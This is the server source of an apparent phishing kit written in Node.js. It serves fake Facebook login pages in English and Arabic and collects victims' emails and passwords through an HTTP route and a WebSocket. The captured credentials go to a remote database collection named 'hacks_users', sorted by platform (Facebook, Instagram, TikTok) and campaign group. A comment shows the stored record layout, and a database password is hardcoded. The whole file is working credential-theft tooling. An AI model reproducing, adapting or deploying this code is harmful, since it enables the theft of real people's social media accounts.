const express = require('express')
const http = require('http')
const XMLHttpRequest = require('xhr2')
const cors = require('cors')
const websocket = require('ws')
const dibase = require('./module/DIBASE')
const app = express()
const server = http.createServer(app)
const wss = new websocket.Server({ server })
const fs = require('fs')
const PORT = 2007; 
var PAGES = {}
const domains ={
    id:"server-users",
    domains:[
        {
            name:"hacks_users",
            password:"HACKUSERSPASS"
        }
    ] 
}
const dib = new dibase('wss://dibase.onrender.com', domains)
const { hacks_users } = dib.base 
app.use(cors({
    origin:'*'
}))

app.use(express.urlencoded({ extended: true }))
app.use(express.static('./PUB'))
app.get('/',(req, res)=>{
    res.send('<h1>Hello<h1>')
})
app.get('/facebook-login/:dORf/:leng',(req, res)=>{
    let { dORf, leng } = req.params
    if (dORf == 'd') {
        if (leng == 'en') {
            res.sendFile(__dirname + '/PUB/facebook-login-d-en.html')
            return
        }
        if (leng == 'ar') {
            res.sendFile(__dirname + '/PUB/facebook-login-d-ar.html')
            return
        }
    }
    if (dORf == 'f') {
        if (leng == 'en') {
            res.sendFile(__dirname + '/PUB/facebook-login-en.html')
            
            return
        }
        if (leng == 'ar') {
            res.sendFile(__dirname + '/PUB/facebook-login-ar.html')
            return
        }
    }
}) 

app.get('/:type/:greep/set',(req, res)=>{
    res.status(200)
    if (req.params.type == 'facebook' || req.params.type == 'instagram') {
        save_data({query:req.query, greep:req.params.greep})
        if (req.query.to) {
            res.redirect(req.query.to += '?log=true')
        }
    }
})  

//=======================================================================
var DATA = {}
hacks_users.onchange = ({dataA, dataB})=>{
    console.log('DATA ',JSON.stringify(dataB))
}
hacks_users.onload = async(data)=>{
    console.log('DATA LOAD',data)
    // return hacks_users.clear(1)
    if (! data.all_users) {
        hacks_users.setpath(['all_users'])
        hacks_users.setpath(['type', 'facebook'])
        hacks_users.setpath(['type', 'instagram'])
        hacks_users.setpath(['type', 'tiktok'])
    }
}
//=========================> Save Data <==============================================
const save_data = (data)=>{
    let user_name = email_name(data.email) 
    let path = ['type', data.type, data.greep]
    let full_path = ['type', data.type, data.greep, user_name]
    user_name = email_name(data.email)
    if (dib.GTPath(hacks_users.data, full_path)) {
        return
    }
    if (! dib.IPath(DATA, path)) {
        hacks_users.setpath(path)
    }
    if (! dib.IPath(DATA, full_path)) {
        hacks_users.setpath(full_path, true)
        hacks_users.set({[user_name]:data},path)
    }
}
const email_name = (email)=>{
    let Email = email
    if (Email.indexOf('@')) {
        return Email.slice(0,Email.indexOf('@'))
    }
    return Email
}
const preparation_html = ()=>{
    let config = require('./PUB/config.json')
    let keys = Object.keys(config)
    let values = Object.values(config)
    for (let i = 0; i < keys.length; i++) {
        PAGES[keys[i]] = atob(values[i])        
    }
}
server.listen(PORT, ()=>{
    console.log(`i am listening in port : ${PORT}`)
    preparation_html()
})

//-------------------------------------------------------------------------------
wss.on('connection', (ws)=>{

    ws.on('message',(message)=>{
        let data = JSON.parse(message.toString('utf-8'))
        if (data.message) {
            if (data.message == 'call-me') {
                ws.send(JSON.stringify({
                    message:'send-me-the-data'
                }))
            }
            return
        }
        if (data.data) {
            if (data.data.email && data.data.password) { 
                save_data(data.data)
                ws.send('{"message":"saveed"}')
            }
            return
        }
    })
})
/*////////////////////////// Example //////////////////////
 {
    type:{
        facebook:{
            [ greep ]:{
                [ username ]:{
                    date    :"",
                    email   :"",
                    password:"" 
                }
            },
            [ greep ]:{
                [ username ]:{
                    date    :"",
                    email   :"",
                    password:"" 
                }
            }
        },
        instgram:{},
        tktok:{}
    }
 }
*/